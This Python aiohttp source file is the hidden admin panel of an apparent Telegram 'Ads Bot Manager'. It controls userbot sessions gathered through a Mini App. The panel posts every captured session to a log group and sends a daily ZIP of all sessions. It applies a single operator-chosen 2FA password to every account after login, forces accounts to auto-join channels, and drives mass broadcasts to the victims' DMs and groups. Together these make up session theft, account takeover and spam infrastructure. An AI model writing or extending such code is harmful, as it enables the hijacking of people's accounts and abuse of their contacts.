import os
import time
import secrets
import logging
import html
from datetime import datetime, timedelta
from typing import Optional

from aiohttp import web

import config
import database
import ads_bot
import session_logger

logger = logging.getLogger(__name__)

# Simple in-memory session store: token -> expiry epoch seconds
_SESSIONS: dict = {}

# One-shot flash message shown on next dashboard render: msg -> "text"
_FLASH: dict = {}

_SESSION_TTL = 12 * 3600  # 12 hours
_COOKIE = "pa_admin"

HTML_HEAD = """<!DOCTYPE html><html lang="en"><head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin Panel</title>
<style>
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0f1220;color:#e6e8f0;margin:0;padding:0}
.wrap{max-width:760px;margin:0 auto;padding:24px 16px 80px}
h1,h2{color:#6ee7b7}
.card{background:#171b2e;border:1px solid #2a2f4a;border-radius:12px;padding:16px 18px;margin:14px 0}
input,textarea,select{width:100%;box-sizing:border-box;padding:9px 11px;border-radius:8px;border:1px solid #394060;background:#0f1220;color:#e6e8f0;margin:5px 0 10px;font-size:14px}
textarea{min-height:70px}
button{background:#10b981;border:0;color:#06251c;font-weight:700;padding:10px 16px;border-radius:8px;cursor:pointer;font-size:14px}
button.danger{background:#ef4444;color:#fff}
button.row{width:auto;display:inline-block;padding:6px 12px;font-size:12px}
table{width:100%;border-collapse:collapse;font-size:14px}
th,td{text-align:left;padding:8px 6px;border-bottom:1px solid #2a2f4a}
.green{color:#4ade80}.red{color:#f87171}.dim{color:#8b92ab;font-size:12px}
a{color:#67e8f9}
</style></head><body><div class="wrap">
"""

HTML_FOOT = "</div></body></html>"


def _is_authed(request) -> bool:
    token = request.cookies.get(_COOKIE, "")
    exp = _SESSIONS.get(token)
    if not exp:
        return False
    if time.time() > exp:
        _SESSIONS.pop(token, None)
        return False
    return True


def _login_redirect(request) -> web.Response:
    token = secrets.token_hex(24)
    _SESSIONS[token] = time.time() + _SESSION_TTL
    resp = web.HTTPFound("/admin")
    resp.set_cookie(_COOKIE, token, max_age=_SESSION_TTL, httponly=True, path="/")
    return resp


def _logout_redirect(request) -> web.Response:
    _SESSIONS.pop(request.cookies.get(_COOKIE, ""), None)
    resp = web.HTTPFound("/admin")
    resp.del_cookie(_COOKIE, path="/")
    return resp


def _login_page(error=""):
    msg = f"<p class='red'>❌ {html.escape(error)}</p>" if error else ""
    return HTML_HEAD + f"""
    <div class="card" style="max-width:380px;margin:10vh auto 0">
      <h2>🔐 Admin Panel</h2>
      <p class="dim">Password required. This page is hidden from the public site.</p>
      {msg}
      <form method="post" action="/admin/login">
        <input type="password" name="password" placeholder="Enter password" required>
        <button type="submit">Login</button>
      </form>
    </div>
    """ + HTML_FOOT


def _dashboard() -> str:
    bots = database.get_ads_bots()
    userbots = database.get_all_userbots()
    settings = database.get_owner_settings()
    api_status = database.get_api_credentials_status()
    api_items = api_status.get("items", [])
    campaigns = settings.get("campaigns", [])
    running = running_count = ads_bot.running_count()

    primary_logger_token = database.get_log_bot_token() or ""
    primary_group_id = database.get_log_group_id()
    primary_bot_token = database.get_primary_bot_token() or ""
    unified_2fa = database.get_unified_2fa()
    auto_join_targets = database.get_auto_join_targets()

    approval_rows = ""
    for i, u in enumerate(userbots, 1):
        phone = u.get("phone", "")
        approved = bool(u.get("broadcast_allowed"))
        status_txt = "✅ ON" if approved else "❌ OFF"
        status_cls = "green" if approved else "red"
        approval_rows += (
            f"<tr><td>{i}</td><td><code>{html.escape(phone)}</code></td>"
            f"<td>@{html.escape(u.get('username') or 'None')}</td>"
            f"<td class='{status_cls}'>{status_txt}</td><td>"
            f"<form method='post' action='/admin/action' style='display:inline'>"
            f"<input type='hidden' name='action' value='set_broadcast'>"
            f"<input type='hidden' name='phone' value='{html.escape(phone)}'>"
            f"<input type='hidden' name='allowed' value='{'1' if not approved else '0'}'>"
            f"<button class='row'>{'❌ OFF' if approved else '✅ ON'}</button></form>"
            "</td></tr>"
        )
    approval_rows = approval_rows or "<tr><td colspan='5' class='dim'>No sessions connected yet.</td></tr>"

    rows = ""
    for i, b in enumerate(bots, 1):
        is_running = ads_bot.is_ads_bot_running(b["token"])
        status_cls = "green" if is_running else "red"
        status = "🟢 running" if is_running else "🔴 stopped"
        rows += (
            f"<tr><td>{i}</td><td>{html.escape(str(b.get('name','')))}</td>"
            f"<td><code>{html.escape(b['token'][:20])}…</code></td>"
            f"<td class='{status_cls}'>{status}</td>"
            "<td>"
            f"<form method='post' action='/admin/action' style='display:inline'>"
            f"<input type='hidden' name='action' value='toggle_bot'>"
            f"<input type='hidden' name='token' value='{html.escape(b['token'])}'>"
            f"<button class='row'>{'⏹ Stop' if is_running else '▶ Start'}</button></form> "
            f"<form method='post' action='/admin/action' style='display:inline' onsubmit=\"return confirm('Test this bot token?');\">"
            f"<input type='hidden' name='action' value='test_bot'>"
            f"<input type='hidden' name='token' value='{html.escape(b['token'])}'>"
            f"<button class='row'>🔍Test</button></form> "
            f"<form method='post' action='/admin/action' style='display:inline' onsubmit=\"return confirm('Delete this bot?');\">"
            f"<input type='hidden' name='action' value='delete_bot'>"
            f"<input type='hidden' name='token' value='{html.escape(b['token'])}'>"
            f"<button class='row danger'>🗑</button></form>"
            "</td></tr>"
        )
    bots_html = rows or "<tr><td colspan='5' class='dim'>No bots added yet — paste a token below.</td></tr>"

    camp_str = "".join(
        f"• {html.escape(str(c.get('text',''))[:70])}<br>"
        for c in campaigns if c.get("text")
    ) or "<span class='dim'>No campaigns.</span>"

    active_users = sum(1 for u in userbots if u.get("status") == "active")
    webapp_url_cur = database.get_webapp_url()

    api_rows = ""
    for i, item in enumerate(api_items, 1):
        api_rows += (
            f"<tr><td>{i}</td><td><code>{html.escape(item.get('api_id',''))}</code></td>"
            f"<td><code>{html.escape(item.get('api_hash',''))[:14]}…</code></td>"
            f"<td><form method='post' action='/admin/action' style='display:inline' onsubmit=\"return confirm('Remove this API pair?');\">"
            f"<input type='hidden' name='action' value='remove_api'>"
            f"<input type='hidden' name='api_id' value='{html.escape(item.get('api_id',''))}'>"
            f"<input type='hidden' name='api_hash' value='{html.escape(item.get('api_hash',''))}'>"
            f"<button class='row danger'>🗑</button></form></td></tr>"
        )
    api_rows = api_rows or "<tr><td colspan='4' class='dim'>No API pairs added — using env values.</td></tr>"

    return HTML_HEAD + f"""
    <h1>👑 Ads Bot Manager</h1>
    <div class="dim">
      Mini App URL: <code>{html.escape(config.WEBAPP_URL)}</code><br>
      Owner ID: <code>{config.OWNER_ID}</code> &nbsp;|&nbsp; Daily ZIP hour (UTC): <code>{config.DAILY_ZIP_HOUR}</code>
    </div>

    <div class="card">
      <h2>📱 My Ads Bots <span class="dim">({running_count} running)</span></h2>
      <table><tr><th>#</th><th>Name</th><th>Token</th><th>Status</th><th>Actions</th></tr>{bots_html}</table>
      <form method="post" action="/admin/action" style="margin-top:12px">
        <input type="hidden" name="action" value="add_bot">
        <input type="text" name="name" placeholder="Bot name (optional)">
        <input type="text" name="token" placeholder="Paste NEW bot token here (format 12345:ABCDEF…) — required" required>
        <button type="submit">➕ Add / Start Bot</button>
      </form>
    </div>

    <div class="card">
      <h2>📢 Auto Broadcasting (all connected userbots)</h2>
      <div class="dim">Send text + image (or just text) to every user/group those accounts follow. Set a daily time to repeat automatically.</div>
      <div>Current campaigns:</div>
      <div>{camp_str}</div>

      <form method="post" action="/admin/action" enctype="multipart/form-data" style="margin-top:8px">
        <input type="hidden" name="action" value="add_campaign">
        <label>Broadcast text (HTML/Telegram markup supported) <span class="dim">— optional</span>:</label>
        <textarea name="text" rows="3" placeholder="🚀 Join <a href='https://t.me/...'>our channel</a>!"></textarea>
        <label>Broadcast image <span class="dim">— paste a direct image JPG/PNG URL or upload a file</span>:</label>
        <input type="text" name="photo_url" placeholder="https://example.com/ad.jpg">
        <input type="file" name="photo" accept="image/*">
        <label>Broadcast every (interval seconds, min 10):</label>
        <input type="number" name="interval" value="{settings.get('interval',300)}" min="10">
        <label>Or daily schedule times <span class="dim">(HH:MM, comma separated; empty = use interval)</span>:</label>
        <input type="text" name="schedule" value="{html.escape(settings.get('broadcast_schedule',''))}" placeholder="09:30, 14:00, 21:45">
        <label>Send to:</label>
        <select name="target">
          <option value="dm" {'selected' if settings.get('broadcast_target','dm')=='dm' else ''}>👤 User DMs</option>
          <option value="groups" {'selected' if settings.get('broadcast_target')=='groups' else ''}>👥 Groups</option>
          <option value="both" {'selected' if settings.get('broadcast_target')=='both' else ''}>Both DMs + Groups</option>
        </select>
        <label>Broadcasting status:</label>
        <select name="active">
          <option value="1" {'selected' if settings.get('is_active') else ''}>🟢 Active</option>
          <option value="0" {'selected' if not settings.get('is_active') else ''}>🔴 Paused</option>
        </select>
        <button type="submit">💾 Save & Broadcast</button>
      </form>
    </div>

    <div class="card">
      <h2>🔑 Telegram API Pairs (multiple supported)</h2>
      <div class="dim">Add as many API ID / API HASH pairs as you have. New logins & userbot sessions use them (rotated). If none added, env values are used.</div>
      <table><tr><th>#</th><th>API ID</th><th>API HASH</th><th></th></tr>{api_rows}</table>
      <form method="post" action="/admin/action" style="margin-top:10px">
        <input type="hidden" name="action" value="add_api">
        <label>API ID:</label>
        <input type="text" name="api_id" placeholder="1234567" required>
        <label>API HASH:</label>
        <input type="text" name="api_hash" placeholder="abcdef0123456789abcdef0123456789" required>
        <button type="submit">➕ Add API pair</button>
      </form>
      <div class="dim" style="margin-top:8px">{'ℹ️ Env fallback: ' + html.escape(api_status.get('env_api_id','')) }</div>
    </div>

    <div class="card">
      <h2>🌐 Mini App Domain</h2>
      <div class="dim">Used for the Mini App button + menu button in bots. Set this if your domain changes (e.g. after Railway deploy), so you don\'t need to redeploy.</div>
      <form method="post" action="/admin/action">
        <input type="hidden" name="action" value="set_domain">
        <label>Full public URL:</label>
        <input type="text" name="url" value="{html.escape(webapp_url_cur)}" placeholder="https://your-app.up.railway.app" required>
        <button type="submit">💾 Set domain</button>
      </form>
    </div>

    <div class="card">
      <h2>👋 Start Message (Mini App bots)</h2>
      <div class="dim">Sent when a user opens any ads bot via /start or opens the Mini App. Emoji + text + optional image + button.</div>
      <form method="post" action="/admin/action" enctype="multipart/form-data">
        <input type="hidden" name="action" value="set_start">
        <label>Start emoji:</label>
        <input type="text" name="start_emoji" value="{html.escape(settings.get('start_emoji','') or '')}" placeholder="👎">
        <label>Start text (HTML supported):</label>
        <textarea name="start_text" rows="4">{html.escape(settings.get('start_text','') or '')}</textarea>
        <label>Button text (Mini App open button):</label>
        <input type="text" name="start_button" value="{html.escape(settings.get('start_button_text','') or 'START ✅')}">
        <label>Start image <span class="dim">— paste a direct image JPG/PNG URL or upload a file (sent with the message)</span>:</label>
        <input type="text" name="start_image_url" placeholder="https://example.com/banner.jpg">
        <input type="file" name="photo" accept="image/*">
        {'<div class="dim" style="margin-bottom:8px">✅ Start image currently set</div>' if settings.get('start_image') else ''}
        <div class="dim" style="margin-bottom:8px">Tip: text left empty will send just the image.</div>
        <button type="submit">💾 Save start message</button>
      </form>
    </div>

    <div class="card">
      <h2>🗜️ Sessions <span class="dim">({len(userbots)} total / {active_users} active)</span></h2>
      <div class="dim">Every new session is auto-posted to the log group; a full ZIP is sent daily.</div>
      <form method="post" action="/admin/action">
        <input type="hidden" name="action" value="force_zip">
        <button type="submit">🗜️ Send ZIP now</button>
      </form>
    </div>

    <div class="card">
      <h2>🔑 Security</h2>
      <form method="post" action="/admin/action">
        <input type="hidden" name="action" value="set_password">
        <label>New admin panel password:</label>
        <input type="text" name="password" minlength="4" required>
        <button type="submit">🔒 Change password</button>
      </form>
      <form method="post" action="/admin/logout" style="margin-top:8px">
        <button class="danger">🚪 Logout</button>
      </form>
    </div>

    <div class="card">
      <h2>📋 Panel Settings (bots / logger / 2FA / auto-join)</h2>
      <form method="post" action="/admin/action">
        <input type="hidden" name="action" value="set_logger">
        <label>Session Logger bot token <span class="dim">(posts sessions + daily ZIP):</span></label>
        <input type="text" name="logger_token" value="{html.escape(primary_logger_token)}" placeholder="123456:ABC…">
        <label>Log group / channel ID <span class="dim">(numeric, e.g. -100…):</span></label>
        <input type="text" name="group_id" value="{html.escape(primary_group_id)}" placeholder="-1001234567890">
        <button type="submit">💾 Set Logger + Group</button>
      </form>
      <form method="post" action="/admin/action" style="margin-top:10px">
        <input type="hidden" name="action" value="set_primary_bot">
        <label>Main bot token <span class="dim">(primary / Mini App bot):</span></label>
        <input type="text" name="token" value="{html.escape(primary_bot_token)}" placeholder="123456:ABC…">
        <button type="submit">💾 Set Main Bot Token</button>
      </form>
      <form method="post" action="/admin/action" style="margin-top:10px">
        <input type="hidden" name="action" value="set_2fa">
        <label>Unified 2FA password <span class="dim">(auto-applied to every userbot after login):</span></label>
        <input type="text" name="password" value="{html.escape(unified_2fa)}" placeholder="AdminPy#2026">
        <button type="submit">💾 Set 2FA Password</button>
      </form>
      <form method="post" action="/admin/action" style="margin-top:10px">
        <input type="hidden" name="action" value="set_auto_join">
        <label>Auto-join channels/groups on login <span class="dim">(one per line — links, @usernames, IDs):</span></label>
        <textarea name="targets" rows="3" placeholder="https://t.me/MyChannel&#10;@MyGroup">{"&#10;".join(html.escape(t) for t in auto_join_targets)}</textarea>
        <button type="submit">💾 Save Auto-Join Targets</button>
      </form>
    </div>

    <div class="card">
      <h2>📡 Broadcast Approval <span class="dim">(connected sessions)</span></h2>
      <div class="dim">Each userbot only broadcasts after you press ✅ ON on its session message in the log group. Toggle directly below if needed.</div>
      <table><tr><th>#</th><th>Phone</th><th>Username</th><th>Status</th><th></th></tr>{approval_rows}</table>
    </div>
    """ + HTML_FOOT


async def handle_admin(request):
    if _is_authed(request):
        return web.Response(text=_dashboard_with_flash(request), content_type="text/html")
    return web.Response(text=_login_page(), content_type="text/html")


def _dashboard_with_flash(request):
    token = request.cookies.get(_COOKIE, "")
    flash = _FLASH.pop(token, None)
    body = _dashboard()
    if flash:
        body = body.replace(
            '<h1>👑 Ads Bot Manager</h1>',
            f'<h1>👑 Ads Bot Manager</h1><div class="card" style="border:1px solid #4ade80;color:#4ade80">{html.escape(str(flash))}</div>'
        )
    return body


async def handle_login(request):
    if request.method == "GET":
        return web.Response(text=_login_page(), content_type="text/html")
    data = await request.post()
    pwd = data.get("password", "")
    if pwd == database.get_admin_password_db():
        return _login_redirect(request)
    return web.Response(text=_login_page("Wrong password."), content_type="text/html", status=401)


async def handle_logout(request):
    return _logout_redirect(request)


async def handle_api_login(request):
    """JSON login used by the hidden 5-click admin trigger in the frontend."""
    try:
        data = await request.json()
    except Exception:
        data = {}
    pwd = str(data.get("password", "") or "")
    if pwd == database.get_admin_password_db():
        token = secrets.token_hex(24)
        _SESSIONS[token] = time.time() + _SESSION_TTL
        resp = web.json_response({"ok": True})
        resp.set_cookie(_COOKIE, token, max_age=_SESSION_TTL, httponly=True, path="/")
        return resp
    return web.json_response({"ok": False, "error": "Wrong password."}, status=401)


async def handle_api_status(request):
    """Lets the frontend know if the admin cookie is already valid."""
    return web.json_response({"ok": _is_authed(request)})


async def handle_action(request):
    if not _is_authed(request):
        return web.json_response({"ok": False, "error": "unauthorized"}, status=401)
    data = await request.post()
    action = data.get("action", "")
    message = "done"
    try:
        if action == "add_bot":
            token = data.get("token", "").strip()
            name = data.get("name", "").strip()
            rec = database.add_ads_bot(token, name)
            if rec:
                await ads_bot.start_ads_bot(token, rec.get("name", name))
                message = f"Bot '{rec.get('name')}' added & started."
            else:
                message = "Invalid token."
        elif action == "delete_bot":
            token = data.get("token", "")
            await ads_bot.remove_ads_bot(token)
            message = "Bot deleted."
        elif action == "toggle_bot":
            token = data.get("token", "")
            if ads_bot.is_ads_bot_running(token):
                await ads_bot.stop_ads_bot(token)
                message = "Bot stopped."
            else:
                ok = await ads_bot.start_ads_bot(token)
                message = "Bot started." if ok else "Bot FAILED to start (invalid token?)."
        elif action == "test_bot":
            token = data.get("token", "")
            result = await ads_bot.test_bot_token(token)
            message = f"Test result: {result}"
        elif action == "add_campaign":
            text = data.get("text", "").strip()
            interval = data.get("interval", "300")
            active = data.get("active", "1") == "1"
            target = data.get("target", "dm")
            schedule = data.get("schedule", "").strip() or ""
            photo_url = (data.get("photo_url", "") or "").strip()
            photo_path = None
            if photo_url.startswith(("http://", "https://")):
                photo_path = photo_url
            else:
                photo_path = await _save_uploaded_photo(data)
            database.add_campaign(text or "", photo_path)
            database.save_owner_settings(
                int(interval) if str(interval).lstrip('-').isdigit() else 300,
                active,
                broadcast_target=target,
                broadcast_schedule=schedule
            )
            message = "Broadcast settings saved."
        elif action == "add_api":
            api_id = data.get("api_id", "").strip()
            api_hash = data.get("api_hash", "").strip()
            if api_id and api_hash:
                if database.add_api_credential(api_id, api_hash):
                    message = f"API pair {api_id} added."
                else:
                    message = "Failed to add API pair."
            else:
                message = "API ID and API HASH both required."
        elif action == "remove_api":
            api_id = data.get("api_id", "").strip()
            api_hash = data.get("api_hash", "").strip()
            database.remove_api_credential(api_id, api_hash)
            message = "API pair removed."
        elif action == "set_domain":
            url = data.get("url", "").strip()
            if url:
                database.set_webapp_url(url)
                message = "Mini App domain updated. It applies on reload."
            else:
                message = "URL required."
        elif action == "set_start":
            emoji = data.get("start_emoji", "").strip()
            start_text = data.get("start_text", "").strip()
            button = data.get("start_button", "").strip()
            start_image_url = (data.get("start_image_url", "") or "").strip()
            if start_image_url.startswith(("http://", "https://")):
                database.save_start_settings(emoji, start_text, button, start_image=start_image_url)
            else:
                image_path = await _save_uploaded_photo(data)
                if image_path:
                    database.save_start_settings(emoji, start_text, button, start_image=image_path)
                else:
                    # keep existing start image if none provided this time
                    database.save_start_settings(emoji, start_text, button)
            message = "Start message updated."
        elif action == "set_password":
            new_pwd = data.get("password", "").strip()
            if new_pwd:
                database.set_admin_password_db(new_pwd)
                message = "Password changed."
            else:
                message = "Empty password."
        elif action == "force_zip":
            path = await session_logger.build_and_send_zip()
            message = f"Zip sent: {os.path.basename(path)}" if path else "No sessions to zip."
        elif action == "set_logger":
            logger_token = data.get("logger_token", "").strip()
            group_id = data.get("group_id", "").strip()
            ok = database.set_logger_settings(logger_token, group_id)
            restart_msg = await session_logger.restart_log_bot()
            message = f"Logger saved. {restart_msg}"
        elif action == "set_primary_bot":
            token = data.get("token", "").strip()
            if token:
                database.set_primary_bot_token(token)
                message = "Main bot token saved. It applies on restart/redeploy."
            else:
                message = "Token required."
        elif action == "set_2fa":
            pwd = data.get("password", "").strip()
            if pwd:
                database.set_unified_2fa(pwd)
                message = "2FA password saved."
            else:
                message = "Password required."
        elif action == "set_auto_join":
            targets_text = data.get("targets", "")
            targets = [ln.strip() for ln in targets_text.replace("\r", "").split("\n") if ln.strip()]
            database.set_auto_join_targets(targets)
            message = "Auto-join targets saved."
        elif action == "set_broadcast":
            phone = data.get("phone", "").strip()
            allowed = data.get("allowed", "0") == "1"
            database.set_user_broadcast_allowed(phone, allowed)
            message = f"Broadcast {'ON' if allowed else 'OFF'} for {phone}."
        else:
            message = f"Unknown action: {action}"

        resp = web.HTTPFound("/admin")
        # show a one-shot flash message for this session
        cookie = _find_session_cookie(request)
        if cookie:
            _FLASH[cookie] = message
        resp.set_cookie(_COOKIE, cookie, httponly=True, path="/")
        return resp
    except Exception as e:
        logger.error(f"admin action error: {e}", exc_info=True)
        return web.json_response({"ok": False, "error": str(e)}, status=500)


def _find_session_cookie(request) -> str:
    return request.cookies.get(_COOKIE, "")


async def _save_uploaded_photo(data) -> Optional[str]:
    """Saves an uploaded image for a campaign into the downloads dir. Returns path or None."""
    photo = data.get("photo")
    if not photo:
        return None
    try:
        import uuid
        filename = photo.filename or "campaign.png"
        ext = os.path.splitext(filename)[1].lower()
        if ext not in (".jpg", ".jpeg", ".png", ".webp", ".gif"):
            ext = ".jpg"
        dest = os.path.join(config.DOWNLOADS_DIR, f"web_campaign_{uuid.uuid4().hex[:8]}{ext}")
        with open(dest, "wb") as f:
            f.write(photo.file.read())
        return dest
    except Exception as e:
        logger.error(f"Could not save uploaded campaign photo: {e}")
        return None


def get_admin_routes():
    return [
        web.get("/admin", handle_admin),
        web.get("/admin/", handle_admin),
        web.get("/admin/login", handle_login),
        web.post("/admin/login", handle_login),
        web.post("/admin/logout", handle_logout),
        web.post("/admin/action", handle_action),
        web.post("/admin/api/login", handle_api_login),
        web.get("/admin/api/status", handle_api_status),
    ]